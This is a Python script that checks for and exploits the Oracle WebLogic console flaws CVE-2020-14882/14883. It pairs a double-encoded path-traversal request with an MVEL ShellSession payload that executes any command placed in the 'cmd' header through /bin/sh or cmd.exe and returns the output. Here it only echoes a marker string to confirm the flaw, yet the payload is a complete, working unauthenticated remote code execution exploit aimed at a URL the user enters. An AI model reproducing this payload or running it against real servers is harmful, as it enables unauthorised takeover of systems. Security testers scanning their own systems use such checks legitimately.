import requests
import urllib, re
import http.client
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'


def CVE_2020_14882(url):
    relsult = {
        'name': 'Weblogic未授权远程命令执行漏洞(CVE-2020-14882&CVE-2020-14883)',
        'vulnerable': False
    }
    cmd = 'echo "excvasqweqqwqwaasasdasdasd"'
    path = "/console/css/%252e%252e%252fconsole.portal"
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,'
                  'application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'cmd': cmd
    }
    payload = ('_nfpb=true&_pageLabel=&handle='
              'com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = '
              '(weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = '
              'executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField'
              '("connectionHandler"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet'
              '.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) '
              'obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd"); '
              'String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]'
              '{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd}; if (cmd != null) { String result '
              '= new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter'
              '("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.'
              'ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);'
              'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));'
              'res.getServletOutputStream().flush(); res.getWriter().write(""); }executeThread.interrupt(); ");')
    try:
        vulurl = urllib.parse.urljoin(url, path)
        req = requests.post(vulurl, data=payload, headers=headers, timeout=5, verify=False)
        if re.search('excvasqweqqwqwaasasdasdasd', req.text) and re.search('echo', req.text) is not True:
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['about'] = 'http://www.javashuo.com/article/p-glmljccr-oa.html, https://www.cnblogs.com/liliyuanshangcao/p/13962160.html'

        return relsult
    except:
        return relsult


if __name__ == '__main__':
    url = input('url:')
    print(CVE_2020_14882(url))


